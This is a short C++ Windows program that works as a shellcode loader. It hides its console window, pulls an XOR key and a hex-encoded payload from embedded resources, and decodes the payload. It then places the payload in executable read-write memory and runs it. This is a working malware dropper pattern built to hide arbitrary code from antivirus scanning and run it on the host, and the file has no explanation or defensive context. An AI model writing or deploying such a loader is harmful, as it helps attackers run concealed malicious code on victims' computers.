#include <iostream>
#include <string>
#include <windows.h>
#include "resource.h"

int main(int argc, char** argv)
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);

	HRSRC keyResource = FindResource(NULL, MAKEINTRESOURCE(IDR_KEY1), L"key");
	DWORD keySize = SizeofResource(NULL, keyResource);
	char* key = (char*)LockResource(LoadResource(NULL, keyResource));

	HRSRC obfuscatedPayloadResource = FindResource(NULL, MAKEINTRESOURCE(IDR_OBFUSCATEDPAYLOAD1), L"obfuscatedPayload");
	DWORD obfuscatedPayloadSize = SizeofResource(NULL, obfuscatedPayloadResource);
	char* obfuscatedPayload = (char*)LockResource(LoadResource(NULL, obfuscatedPayloadResource));
	std::string payload = "";

	int keyIndex = 0;
	for (unsigned int i = 0; i < obfuscatedPayloadSize; i += 4)
	{
		std::string currentByte = std::string() + obfuscatedPayload[i] + obfuscatedPayload[i + 1] + obfuscatedPayload[i + 2] + obfuscatedPayload[i + 3];
		payload += stol(currentByte, nullptr, 0) ^ key[keyIndex++ % keySize];
	}

	void* exec = VirtualAlloc(0, payload.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	std::memcpy(exec, payload.c_str(), payload.size());

	((void(*)())exec)();

	VirtualFree(exec, 0, MEM_RELEASE);

	return 0;
}
